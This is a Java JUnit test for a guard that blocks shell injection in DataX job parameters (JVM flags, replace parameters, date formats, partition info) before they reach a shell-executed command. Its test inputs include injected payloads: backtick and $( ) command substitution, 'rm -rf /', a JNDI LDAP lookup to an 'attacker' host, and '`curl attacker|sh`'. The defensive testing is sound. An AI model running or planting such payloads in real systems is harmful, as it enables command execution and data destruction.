package com.wugui.datatx.core.util;

import com.wugui.datatx.core.biz.model.TriggerParam;
import com.wugui.datatx.core.enums.IncrementTypeEnum;
import org.junit.Assert;
import org.junit.Test;

/**
 * 批次 10-F / 10-H：作业参数是命令行片段，不是数据。
 *
 * 执行器把它们拼成 <code>-j"..." -p"..."</code> 交给 datax.py，而 datax.py 收尾是
 * <code>subprocess.Popen(startCommand, shell=True)</code>。本类钉四件事：
 *   1) 双引号内依旧生效的 shell 字符（引号、反引号、$、反斜杠）和换行必须被拒；
 *   2) 合法写法必须放行 —— 尤其 WHERE 条件里常见的 <code>&gt; &lt; ; ( ) %s</code>，
 *      守卫把这些一并禁掉就等于把功能修坏了；
 *   3) 判哪几个字段跟着 incrementType 走，条件与 BuildCommand 的消费条件逐字一致；
 *   4) 判定对象是执行器 trim 之后的那串，不能出现"绿灯放行、红灯炸在 parseInt"。
 */
public class JobParamSafetyTest {

    private static final Integer TIME = Integer.valueOf(IncrementTypeEnum.TIME.getCode());
    private static final Integer ID = Integer.valueOf(IncrementTypeEnum.ID.getCode());
    private static final Integer PARTITION = Integer.valueOf(IncrementTypeEnum.PARTITION.getCode());

    /** 四个字段全判的写法（jvmParam 任何时候都判，其余三段按 TIME 判） */
    private static String denyAll(String jvmParam, String replaceParam,
                                 String replaceParamType, String partitionInfo) {
        // 注意：TIME 只驱动 replaceParam/replaceParamType，PARTITION 驱动 partitionInfo；
        // 这里传两个"不相干"的值给一次调用，等价于分别用各自类型调用。
        String deny = JobParamSafety.denyMessage(jvmParam, replaceParam, replaceParamType, null, TIME);
        return deny != null ? deny : JobParamSafety.denyMessage(jvmParam, replaceParam, null, partitionInfo, PARTITION);
    }

    // ---------------- 拒绝：双引号内仍能闭合或起作用的字符 ----------------

    @Test
    public void rejectsBacktickCommandSubstitutionInJvmParam() {
        String message = denyAll("-Xmx1g `touch /tmp/pwned`", null, null, null);
        Assert.assertNotNull("反引号在双引号内依旧会执行命令替换，必须拒收", message);
        Assert.assertTrue(message, message.contains("JVM 参数"));
        Assert.assertTrue(message, message.contains("反引号"));
        assertDoesNotEchoPayload(message);
    }

    @Test
    public void rejectsDollarCommandSubstitutionInJvmParam() {
        String message = denyAll("-Xms$(id)g", null, null, null);
        Assert.assertNotNull("$( ) 是命令替换，必须拒收", message);
        Assert.assertTrue(message, message.contains("美元符"));
        assertDoesNotEchoPayload(message);
    }

    @Test
    public void rejectsQuoteThatClosesTheArgument() {
        // 闭合掉 -j"..." 之后，后面的内容就是裸命令行
        String message = denyAll("-Xmx1g\" ; rm -rf / ; \"", null, null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("双引号"));
    }

    @Test
    public void rejectsBackslashEscape() {
        // 反斜杠专门用来绕过上面几个字符的过滤，留下它=过滤形同虚设
        String message = denyAll("-Xmx1g \\`id\\`", null, null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("反斜杠"));
    }

    @Test
    public void rejectsNewlineWhichEndsTheCommandLine() {
        String message = denyAll("-Xmx1g\nrm -rf /", null, null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("换行符"));
    }

    @Test
    public void rejectsShellCharsInAnyPartitionSegment() {
        // 三段最终拼成 -p"-Dpartition=<字段>=<日期>"，字段名同样是命令行片段
        String message = denyAll(null, null, null, "dt`id`,-1,yyyyMMdd");
        Assert.assertNotNull("分区字段名带反引号同样会被拼进命令行", message);
        Assert.assertTrue(message, message.contains("分区信息的分区字段"));
    }

    @Test
    public void rejectsInjectionInReplaceParam() {
        String message = denyAll(null, "-Did=${jndi:ldap://attacker/a}", null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量替换参数"));
    }

    /**
     * 批次10-H 的真正发现：日期格式这一栏也是注入点。
     *
     * 反引号/美元符都不是 SimpleDateFormat 的样式字母，会被当成字面量原样留在 sdf.format()
     * 的产出里；那段产出随后进 String.format(replaceParam, ...) 再进 -p"..."。
     * 只判 jvmParam 和 replaceParam 的旧版本在这条路径上是通的。
     */
    @Test
    public void rejectsBacktickInReplaceParamType() {
        String message = denyAll(null, "-Dstart=%s", "yyyy`touch /tmp/pwned`MM", null);
        Assert.assertNotNull("日期样式里的反引号会经 format() 进入命令行，必须拒收", message);
        Assert.assertTrue(message, message.contains("增量时间格式"));
        assertDoesNotEchoPayload(message);
    }

    @Test
    public void rejectsDollarInReplaceParamType() {
        String message = denyAll(null, "-Dstart=%s", "yyyy$(id)MM", null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量时间格式"));
        assertDoesNotEchoPayload(message);
    }

    @Test
    public void rejectsBacktickInPartitionDateFormatSegment() {
        // 第三段同样进 SimpleDateFormat 再拼进 -p"..."，与上一例同一条口子
        String message = denyAll(null, null, null, "dt,-1,yyyy`id`MM");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("分区信息的日期格式"));
    }

    /** 拒绝文案只报字符类型，不能把用户原文回显出去（响应体本身又是一次渲染入口） */
    private static void assertDoesNotEchoPayload(String message) {
        Assert.assertFalse(message, message.contains("`"));
        Assert.assertFalse(message, message.contains("$"));
        Assert.assertFalse(message, message.contains("\\"));
    }

    // ---------------- 放行：合法写法不能被误杀 ----------------

    @Test
    public void allowsBlankParams() {
        Assert.assertNull(denyAll(null, null, null, null));
        Assert.assertNull(denyAll("", "   ", "", "  "));
    }

    @Test
    public void allowsOrdinaryJvmFlags() {
        Assert.assertNull(denyAll("-Xms1g -Xmx2g -Dfile.encoding=UTF-8", null, null, null));
    }

    @Test
    public void allowsWhereClauseMetacharacters() {
        // 这些在 shell 的双引号里是普通字面量；禁掉它们就是把用户的增量条件写不成
        Assert.assertNull(denyAll(null, "-DstartId=id>=%s and id<=%s", null, null));
        Assert.assertNull(denyAll(null, "-Dwhere=(a>=%s)&(b<=%s)", null, null));
    }

    @Test
    public void allowsWellFormedPartitionInfo() {
        Assert.assertNull(denyAll(null, null, null, "dt,-1,yyyyMMdd"));
    }

    /**
     * 带空格的分区配置放行，是因为执行器已经同步改成按 trim 后的片段取值（BuildCommand#buildPartition）。
     *
     * 这一条是"口径一致性"的钉子，不是"空格无害"的表态：只要有一边不 trim，
     * "判的时候 trim、拼的时候不 trim"就会让 Integer.parseInt(" 0 ") 在执行器里炸，
     * 反过来"判的时候不 trim"则把用户手滑的常见写法判死。两边都 trim 才对得上。
     */
    @Test
    public void allowsPartitionInfoWithSurroundingSpaces() {
        Assert.assertNull(denyAll(null, null, null, "ds , 0 , yyyy-MM-dd HH:mm:ss"));
    }

    @Test
    public void allowsTimestampAsTimeFormat() {
        // "Timestamp" 走毫秒时间戳分支，不是日期样式；BuildCommand 现在也是 trim 后再比
        Assert.assertNull(denyAll(null, "-Dstart=%s", "Timestamp", null));
        Assert.assertNull(denyAll(null, "-Dstart=%s", " Timestamp ", null));
        Assert.assertNull(denyAll(null, "-Dstart=%s", null, null));
    }

    // ---------------- incrementType 决定判谁：守卫不能过宽 ----------------

    /**
     * 用自增主键的任务，partition_info 里残留着早先按分区配置时写下的值 —— 这是存量数据最常见的形态。
     * 那三段此时一个都不进命令行，拿它拒任务属于把功能修坏。
     */
    @Test
    public void idIncrementDoesNotCheckPartitionInfoOrTimeFormat() {
        Assert.assertNull(JobParamSafety.denyMessage("-Xmx1g", "-Did>=%s", "yyyy`x`", "dt,-1,bad", ID));
    }

    @Test
    public void partitionIncrementDoesNotCheckReplaceParamType() {
        Assert.assertNull(JobParamSafety.denyMessage(null, null, "yyyy-MM-dd-tt", "dt,-1,yyyyMMdd", PARTITION));
    }

    @Test
    public void timeIncrementDoesNotCheckPartitionInfo() {
        Assert.assertNull(JobParamSafety.denyMessage(null, "-Dstart=%s", "yyyyMMdd", "dt,-1,timestamp", TIME));
    }

    @Test
    public void stillRejectsPayloadThatMatchesTheActiveIncrementType() {
        // 反证上一条：不是"整个守卫变成空转"，字段与类型对上时照样拒
        Assert.assertNotNull(JobParamSafety.denyMessage(null, null, "yyyy-MM-dd-tt", "dt,-1,timestamp", PARTITION));
        Assert.assertNotNull(JobParamSafety.denyMessage(null, "-Dstart=`id`", "yyyyMMdd", null, TIME));
    }

    /**
     * incrementType 为 null 或 0（不自增、不按时间/分区）时，除 jvmParam 外都不判 ——
     * 但 jvmParam 与增量类型无关，任何时候都拼进 -j"..."，任何时候都得判。
     */
    @Test
    public void unknownIncrementTypeStillChecksJvmParam() {
        Assert.assertNull(JobParamSafety.denyMessage("-Xmx1g", "`id`", "yyyy`x`", "dt,-1,bad", null));
        Assert.assertNull(JobParamSafety.denyMessage("-Xmx1g", "`id`", "yyyy`x`", "dt,-1,bad", Integer.valueOf(0)));
        Assert.assertNotNull(JobParamSafety.denyMessage("-Xmx1g `id`", null, null, null, null));
    }

    // ---------------- 分区信息/时间格式的结构错误：报错不能等到执行器 ----------------

    @Test
    public void rejectsPartitionInfoWithWrongSegmentCount() {
        String message = denyAll(null, null, null, "dt,-1");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("2 段"));
    }

    @Test
    public void rejectsPartitionInfoWithBlankSegment() {
        String message = denyAll(null, null, null, "dt,,yyyyMMdd");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("天数偏移为空"));
    }

    @Test
    public void rejectsNonNumericDayOffset() {
        String message = denyAll(null, null, null, "dt,yesterday,yyyyMMdd");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("必须是整数"));
    }

    @Test
    public void rejectsUnparseablePartitionDateFormat() {
        // 执行器会拿它 new SimpleDateFormat(...)，非法样式在执行器线程抛 IllegalArgumentException
        String message = denyAll(null, null, null, "dt,-1,timestamp");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("分区信息的日期格式"));
    }

    @Test
    public void rejectsUnparseableReplaceParamType() {
        // 't' 不是 SimpleDateFormat 的样式字母，执行器拿它去 new SimpleDateFormat 会直接抛
        String message = denyAll(null, "-Dstart=%s", "yyyy-MM-dd-tt", null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量时间格式"));
    }

    // ---------------- TriggerParam 入口（执行器侧用的就是这个重载） ----------------

    @Test
    public void triggerParamOverloadChecksTheSameFieldsWithItsOwnIncrementType() {
        TriggerParam clean = new TriggerParam();
        clean.setIncrementType(TIME);
        clean.setJvmParam("-Xmx1g");
        clean.setReplaceParam("-Did>=%s");
        clean.setReplaceParamType("Timestamp");
        clean.setPartitionInfo("dt,-1,yyyyMMdd");
        Assert.assertNull(JobParamSafety.denyMessage(clean));

        TriggerParam dirty = new TriggerParam();
        dirty.setIncrementType(TIME);
        dirty.setReplaceParam("`curl attacker|sh`");
        String message = JobParamSafety.denyMessage(dirty);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量替换参数"));
        Assert.assertNull(JobParamSafety.denyMessage((TriggerParam) null));
    }

    /**
     * 执行器侧的 incrementType 必须与 BuildCommand 拼命令时用的是同一个值：
     * 两边读同一个 getter，判定条件与消费条件才会一致（这条把"重载没接 incrementType"钉死）。
     */
    @Test
    public void triggerParamOverloadDoesNotCheckFieldsItsIncrementTypeIgnores() {
        TriggerParam stale = new TriggerParam();
        stale.setIncrementType(ID);
        stale.setReplaceParam("-Did>=%s");
        stale.setPartitionInfo("dt,-1,timestamp");
        stale.setReplaceParamType("yyyy`x`");
        Assert.assertNull(JobParamSafety.denyMessage(stale));
    }
}
